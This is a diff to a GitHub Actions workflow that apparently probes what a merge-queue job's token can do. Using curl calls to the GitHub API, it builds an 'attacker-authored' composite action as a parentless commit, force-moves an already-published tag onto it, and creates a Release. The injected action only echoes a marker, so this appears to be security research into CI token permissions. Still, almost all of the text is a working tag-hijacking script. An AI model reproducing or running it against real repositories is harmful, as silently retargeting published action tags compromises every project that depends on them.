@@ -8,31 +8,25 @@ jobs:
   slowgate:
     runs-on: ubuntu-latest
     steps:
-      - name: context
-        run: echo "CPX3 event=${{ github.event_name }} ref=$GITHUB_REF"
-      - name: can this token reach the base repo CONTENT-ADDRESSED write path and a TAG ref?
+      - run: echo "CPX4 event=${{ github.event_name }}"
+      - name: can the job HIJACK an already-published tag, and mint a Release?
         if: github.event_name == 'merge_group'
         env:
           GH_TOKEN: ${{ github.token }}
           R: ${{ github.repository }}
         run: |
-          A=$(printf 'name: cpx-poisoned-action\ndescription: d\nruns:\n  using: composite\n  steps:\n    - run: echo CPX3-POISONED-ACTION-EXECUTED\n      shell: bash\n')
+          H="Authorization: token $GH_TOKEN"
+          A=$(printf 'name: cpx-hijacked\ndescription: d\nruns:\n  using: composite\n  steps:\n    - run: echo CPX4-HIJACKED-EXISTING-TAG\n      shell: bash\n')
           B=$(printf '%s' "$A" | base64 -w0)
-          echo "CPX3 creating blob"
-          BLOB=$(curl -sS -X POST -H "Authorization: token $GH_TOKEN" -H 'Accept: application/vnd.github+json' \
-            -d "{\"content\":\"$B\",\"encoding\":\"base64\"}" https://api.github.com/repos/$R/git/blobs | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('sha') or 'ERR:'+str(d.get('message')))")
-          echo "CPX3 blob=$BLOB"
-          case "$BLOB" in ERR:*) echo "CPX3 RESULT: BLOB WRITE REFUSED"; exit 0;; esac
-          TREE=$(curl -sS -X POST -H "Authorization: token $GH_TOKEN" -H 'Accept: application/vnd.github+json' \
-            -d "{\"tree\":[{\"path\":\"action.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" https://api.github.com/repos/$R/git/trees | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('sha') or 'ERR:'+str(d.get('message')))")
-          echo "CPX3 tree=$TREE"
-          case "$TREE" in ERR:*) echo "CPX3 RESULT: TREE WRITE REFUSED"; exit 0;; esac
-          COMMIT=$(curl -sS -X POST -H "Authorization: token $GH_TOKEN" -H 'Accept: application/vnd.github+json' \
-            -d "{\"message\":\"cpx3 attacker-authored action\",\"tree\":\"$TREE\",\"parents\":[]}" https://api.github.com/repos/$R/git/commits | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('sha') or 'ERR:'+str(d.get('message')))")
-          echo "CPX3 commit=$COMMIT"
-          case "$COMMIT" in ERR:*) echo "CPX3 RESULT: COMMIT WRITE REFUSED"; exit 0;; esac
-          OUT=$(curl -sS -o /tmp/t.json -w '%{http_code}' -X POST -H "Authorization: token $GH_TOKEN" -H 'Accept: application/vnd.github+json' \
-            -d "{\"ref\":\"refs/tags/cpx-rel-v1\",\"sha\":\"$COMMIT\"}" https://api.github.com/repos/$R/git/refs)
-          echo "CPX3 create refs/tags/cpx-rel-v1 -> HTTP $OUT"
-          cat /tmp/t.json | head -c 300; echo
-          echo "CPX3 RESULT: tag-write status $OUT commit $COMMIT"
+          BLOB=$(curl -sS -X POST -H "$H" -d "{\"content\":\"$B\",\"encoding\":\"base64\"}" https://api.github.com/repos/$R/git/blobs | python3 -c "import json,sys;print(json.load(sys.stdin).get('sha','ERR'))")
+          TREE=$(curl -sS -X POST -H "$H" -d "{\"tree\":[{\"path\":\"action.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" https://api.github.com/repos/$R/git/trees | python3 -c "import json,sys;print(json.load(sys.stdin).get('sha','ERR'))")
+          CM=$(curl -sS -X POST -H "$H" -d "{\"message\":\"cpx4 hijack\",\"tree\":\"$TREE\",\"parents\":[]}" https://api.github.com/repos/$R/git/commits | python3 -c "import json,sys;print(json.load(sys.stdin).get('sha','ERR'))")
+          echo "CPX4 new commit=$CM"
+          echo "CPX4 pre-state of the EXISTING tag:"
+          curl -sS -H "$H" https://api.github.com/repos/$R/git/ref/tags/probe-33784799493 | python3 -c "import json,sys;d=json.load(sys.stdin);print('  was ->',(d.get('object') or {}).get('sha'))"
+          S=$(curl -sS -o /tmp/f.json -w '%{http_code}' -X PATCH -H "$H" -d "{\"sha\":\"$CM\",\"force\":true}" https://api.github.com/repos/$R/git/refs/tags/probe-33784799493)
+          echo "CPX4 FORCE-MOVE existing tag -> HTTP $S"
+          head -c 240 /tmp/f.json; echo
+          RS=$(curl -sS -o /tmp/rel.json -w '%{http_code}' -X POST -H "$H" -d "{\"tag_name\":\"cpx-rel-v1\",\"name\":\"cpx release\",\"body\":\"cpx\"}" https://api.github.com/repos/$R/releases)
+          echo "CPX4 CREATE RELEASE -> HTTP $RS"
+          head -c 240 /tmp/rel.json; echo
